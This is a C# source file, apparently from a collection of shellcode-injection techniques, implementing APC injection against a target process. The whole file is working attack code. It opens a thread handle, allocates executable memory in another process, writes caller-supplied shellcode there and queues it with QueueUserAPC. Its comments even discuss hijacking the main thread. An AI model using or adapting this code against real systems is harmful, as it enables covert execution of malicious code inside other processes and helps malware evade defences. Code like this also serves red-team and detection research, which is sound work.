using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class APCInjection : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            ProcessThread thread = GetThread(target.Threads);
            Debug("[+] Found thread: {0}", new string[] { thread.Id.ToString() });

            // get a handle to the thread
            IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
            Debug("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            // allocate some memory for our shellcode
            IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
            Debug("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });

            // write the shellcode into the allocated memory
            Debug("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
            WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);

            // add an asynchronous procedure call
            Debug("[+] QueueUserAPC() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            QueueUserAPC(pAddr, hThread, IntPtr.Zero);
        }

        ProcessThread GetThread(ProcessThreadCollection threads)
        {
            // find a thread
            // it is very likely that the process you are hijacking will be unstable as 0 is probably the main thread
            return threads[0];

            /*
            // you could loop through the threads looking for a better one
            foreach(ProcessThread thread in threads)
            {

            }
            */
        }
    }
}
